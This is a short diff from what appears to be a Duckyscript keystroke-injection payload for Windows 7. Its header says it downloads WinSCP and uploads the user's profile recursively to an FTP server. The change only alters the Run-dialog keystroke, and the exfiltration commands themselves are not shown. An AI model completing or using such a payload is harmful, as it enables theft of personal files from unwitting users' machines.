@@ -4,7 +4,7 @@ Author: Robert Lampe
 Duckencoder: 1.0
 Target: Windows 7
 Description: This script downloads WinSCP and uploads the user profile, recursive, to a FTP server.
- GUI R
+ GUI r
  DELAY 200
  STRING cmd
  ENTER
